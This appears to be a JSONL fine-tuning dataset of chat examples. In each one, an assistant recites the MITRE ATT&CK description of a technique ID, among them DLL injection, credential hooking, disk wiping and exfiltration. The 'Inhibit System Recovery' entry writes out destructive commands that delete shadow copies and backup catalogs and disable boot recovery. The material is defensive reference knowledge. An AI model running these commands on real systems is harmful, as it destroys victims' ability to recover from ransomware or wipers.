{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'At' and with the Id: T1053.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'At' and with the Id: T1053.002 is described as follows: Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Service Execution' and with the Id: T1035 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Service Execution' and with the Id: T1035 is described as follows: Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or privilege escalation.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic-link Library Injection' and with the Id: T1055.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic-link Library Injection' and with the Id: T1055.001 is described as follows: Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'PowerShell' and with the Id: T1086 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'PowerShell' and with the Id: T1086 is described as follows: PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.Administrator permissions are required to use PowerShell to connect to remote systems.A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploits' and with the Id: T1588.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploits' and with the Id: T1588.005 is described as follows: Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Authentication Process' and with the Id: T1556 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Authentication Process' and with the Id: T1556 is described as follows: Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.. The systems targeted by this attack pattern are: Windows, Linux, macOS, Network, Azure AD, Google Workspace, IaaS, Office 365, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credential API Hooking' and with the Id: T1056.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credential API Hooking' and with the Id: T1056.004 is described as follows: Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Firmware Corruption' and with the Id: T1495 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Firmware Corruption' and with the Id: T1495 is described as follows: Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Inhibit System Recovery' and with the Id: T1490 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Inhibit System Recovery' and with the Id: T1490 is described as follows: Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.Adversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware). The systems targeted by this attack pattern are: Windows, macOS, Linux, Network, IaaS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Netsh Helper DLL' and with the Id: T1546.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Netsh Helper DLL' and with the Id: T1546.007 is described as follows: Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing via Service' and with the Id: T1566.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing via Service' and with the Id: T1566.003 is described as follows: Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Internal Proxy' and with the Id: T1090.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Internal Proxy' and with the Id: T1090.001 is described as follows: Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Script Proxy Execution' and with the Id: T1216 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Script Proxy Execution' and with the Id: T1216 is described as follows: Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Custom Command and Control Protocol' and with the Id: T1094 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Custom Command and Control Protocol' and with the Id: T1094 is described as follows: Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dead Drop Resolver' and with the Id: T1102.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dead Drop Resolver' and with the Id: T1102.001 is described as follows: Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'InstallUtil' and with the Id: T1118 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'InstallUtil' and with the Id: T1118 is described as follows: InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Junk Data' and with the Id: T1001.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Junk Data' and with the Id: T1001.001 is described as follows: Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Service' and with the Id: T1598.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Service' and with the Id: T1598.001 is described as follows: Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Commonly Used Port' and with the Id: T1043 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Commonly Used Port' and with the Id: T1043 is described as follows: **This technique has been deprecated. Please use [Non-Standard Port](https://attack.mitre.org/techniques/T1571) where appropriate.**Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as* TCP:80 (HTTP)* TCP:443 (HTTPS)* TCP:25 (SMTP)* TCP/UDP:53 (DNS)They may use the protocol associated with the port or a completely different protocol. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are * TCP/UDP:135 (RPC)* TCP/UDP:22 (SSH)* TCP/UDP:3389 (RDP). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Container API' and with the Id: T1552.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Container API' and with the Id: T1552.007 is described as follows: Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. . The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domains' and with the Id: T1584.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domains' and with the Id: T1584.001 is described as follows: Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SQL Stored Procedures' and with the Id: T1505.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SQL Stored Procedures' and with the Id: T1505.001 is described as follows: Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) . The systems targeted by this attack pattern are: Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Device Authentication' and with the Id: T1556.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Device Authentication' and with the Id: T1556.004 is described as follows: Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disk Content Wipe' and with the Id: T1561.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disk Content Wipe' and with the Id: T1561.001 is described as follows: Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Unencrypted Non-C2 Protocol' and with the Id: T1048.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Unencrypted Non-C2 Protocol' and with the Id: T1048.003 is described as follows: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
